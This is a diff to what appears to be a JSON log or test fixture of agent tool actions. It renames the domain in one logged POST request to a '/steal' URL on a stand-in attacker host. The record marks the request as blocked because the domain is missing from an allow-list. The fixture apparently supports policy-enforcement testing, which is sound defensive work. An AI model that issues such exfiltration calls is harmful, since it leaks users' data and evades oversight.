@@ -76,13 +76,13 @@
       "id": "a677964f-8c8e-4a3d-a2f9-de26126be01e",
       "timestamp": "2026-04-11T00:43:12.226Z",
       "type": "tool.net",
-      "action": "net.POST https://evil-exfiltration.io/steal",
+      "action": "net.POST https://untrusted-external.com/steal",
       "payload": {
         "method": "POST",
-        "url": "https://evil-exfiltration.io/steal"
+        "url": "https://untrusted-external.com/steal"
       },
       "status": "BLOCKED_BY_POLICY",
-      "policyTrigger": "Domain \"evil-exfiltration.io\" not in allow‑list [api.openai.com, huggingface.co]"
+      "policyTrigger": "Domain \"untrusted-external.com\" not in allow‑list [api.openai.com, huggingface.co]"
     },
     {
       "id": "6b2e9514-b81e-40a0-a1ae-f871d181668f",
